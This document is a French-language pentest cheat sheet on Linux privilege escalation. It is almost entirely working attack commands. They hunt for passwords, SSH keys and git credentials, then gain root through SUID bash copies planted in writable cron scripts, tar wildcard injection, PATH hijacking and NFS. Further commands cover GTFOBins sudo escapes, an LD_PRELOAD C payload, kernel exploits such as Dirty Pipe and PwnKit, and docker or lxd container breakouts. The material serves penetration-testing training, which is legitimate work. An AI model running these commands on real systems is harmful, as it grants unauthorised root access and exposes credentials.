# 16 — Linux Privilege Escalation

## Objectifs
Passer de www-data/user à root, sans outil automatique d'abord. Les 4 familles : informations exposées, permissions de fichiers, composants système, noyau.

---

## 1. Énumération manuelle

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
cat /etc/passwd
cat /etc/group
sudo -l
env
cat ~/.bash_history
ls -la /home
ps aux --forest
ss -tulpn
mount
df -h
ls -la /opt /srv /var/www 2>/dev/null
```

```bash
# Fichiers récemment modifiés (indice sur un déploiement)
find / -mtime -2 -type f 2>/dev/null | grep -vE "^/(proc|sys|dev)"
# Fichiers appartenant à l'utilisateur courant
find / -user $(id -u) 2>/dev/null | grep -vE "^/(proc|sys)"
```

### Automatique (ensuite)
```bash
./linpeas.sh -a | tee /tmp/linpeas.txt
./pspy64 -pf -i 1000        # processus sans root
./LinEnum.sh -t
```

---

## 2. Informations confidentielles exposées

```bash
# Historique
cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history 2>/dev/null

# Fichiers de config
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" 2>/dev/null
grep -riE "pass(word|wd)?\s*[:=]" /var/www /opt /home /etc 2>/dev/null | head -50

# Clés SSH
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
ls -la ~/.ssh

# Bases de données
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null

# Backups
ls -la /var/backups /tmp /opt/backup* 2>/dev/null

# Logs
cat /var/log/auth.log 2>/dev/null | tail -50
```

```bash
# Scripts de déploiement / CI
find / -name "*.sh" -o -name "Jenkinsfile" -o -name ".git-credentials" 2>/dev/null | head
cat ~/.git-credentials 2>/dev/null
```

---

## 3. Permissions de fichiers

### Cron
```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/
crontab -l
systemctl list-timers --all
```

```bash
# Script writable exécuté par root
ls -la /opt/backup.sh
echo 'cp /bin/bash /tmp/rb && chmod +s /tmp/rb' >> /opt/backup.sh
# attendre, puis
/tmp/rb -p
```

### Wildcard injection
```bash
# cron : tar czf /backup/backup.tar.gz *
cd /var/backups
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > x.sh
chmod +x x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x.sh'
```

### PATH hijacking
```bash
# Un script root appelle une commande sans chemin absolu
echo -e '#!/bin/sh\n/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# ou écrire dans un dossier déjà présent dans le PATH du cron
```

### Fichiers/dossiers writables
```bash
find / -writable -type f 2>/dev/null | grep -vE "^/(proc|sys)"
find / -writable -type d 2>/dev/null | grep -vE "^/(proc|sys)"
# Cibler ceux utilisés par root (services, scripts, configs)
```

### NFS
```bash
showmount -e <TARGET>
sudo mount -t nfs <TARGET>:/export /mnt -o nolock
cp /bin/bash /mnt/bash && chmod +s /mnt/bash
# sur la cible : /export/bash -p
```

---

## 4. Composants système

### SUID / SGID
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

```bash
# Exploitations classiques (GTFOBins)
/usr/bin/bash -p
find . -exec /bin/sh -p \; -quit
/usr/bin/cp /etc/passwd /tmp/passwd.bak    # puis éditer et recopier
/usr/bin/nmap --interactive                 # !sh (anciennes versions)
/usr/bin/pkexec                             # CVE-2021-4034
```

### Capabilities
```bash
getcap -r / 2>/dev/null
```

```bash
# cap_setuid
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
# cap_dac_read_search → lire /etc/shadow
# cap_sys_admin → mount
```

### Sudo
```bash
sudo -l
```

| Cas | Exploitation |
|---|---|
| `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
| `… /usr/bin/find` | `sudo find / -exec /bin/sh \; -quit` |
| `… /usr/bin/awk` | `sudo awk 'BEGIN{system("/bin/sh")}'` |
| `… /usr/bin/less` | `sudo less /etc/passwd` puis `!/bin/sh` |
| `… /usr/bin/env` | `sudo env /bin/sh` |
| `… /usr/bin/tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `(ALL : ALL) ALL` | `sudo su -` si mot de passe connu |
| `LD_PRELOAD` autorisé | `.so` avec constructeur |

```c
// LD_PRELOAD
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor)) void init(){ setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -o x.so x.c
sudo LD_PRELOAD=/tmp/x.so <commande_autorisee>
```

### Kernel
```bash
uname -a
cat /etc/os-release
./linux-exploit-suggester.sh
searchsploit linux kernel $(uname -r | cut -d- -f1)
```

| CVE | Kernel |
|---|---|
| CVE-2021-4034 | PwnKit (pkexec) |
| CVE-2021-3156 | Baron Samedit (sudo) |
| CVE-2022-0847 | Dirty Pipe (5.8–5.16) |
| CVE-2016-5195 | Dirty COW (2.6–4.8) |
| CVE-2019-13272 | ptrace (4.10–5.1.17) |

```bash
# DirtyPipe (exemple)
gcc dirtypipez.c -o dp && ./dp /usr/bin/su
```

---

## 5. Groupes privilégiés

```bash
id
```

| Groupe | Exploitation |
|---|---|
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` | conteneur privilégié + montage `/` |
| `disk` | `debugfs /dev/sda1` |
| `adm` | lire les logs |
| `sudo`/`wheel` | `sudo -l` |

```bash
# docker
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# lxd
lxc image import alpine.tar.gz --alias a
lxc init a c -c security.privileged=true
lxc config device add c host disk source=/ path=/mnt/root recursive=true
lxc start c && lxc exec c /bin/sh
```

---

## 6. Éditeurs & pager (si lancés en root)

```bash
vi    # :!/bin/sh
vim   # :set shell=/bin/sh  puis :shell
less  # !/bin/sh
more  # !/bin/sh
man   # !/bin/sh
nano  # Ctrl+R Ctrl+X puis commande
```

---

## 7. Checklist

- [ ] `id`, `sudo -l`, `uname -a`, `env`
- [ ] Historique + configs + clés + backups
- [ ] Cron / timers / pspy
- [ ] Fichiers et dossiers writables utilisés par root
- [ ] SUID / SGID + GTFOBins
- [ ] Capabilities
- [ ] Sudo : binaires autorisés, LD_PRELOAD, CVE
- [ ] Groupes (docker, lxd, disk, adm)
- [ ] NFS (no_root_squash)
- [ ] Kernel / exploits
- [ ] Root obtenu + preuve + méthode notée
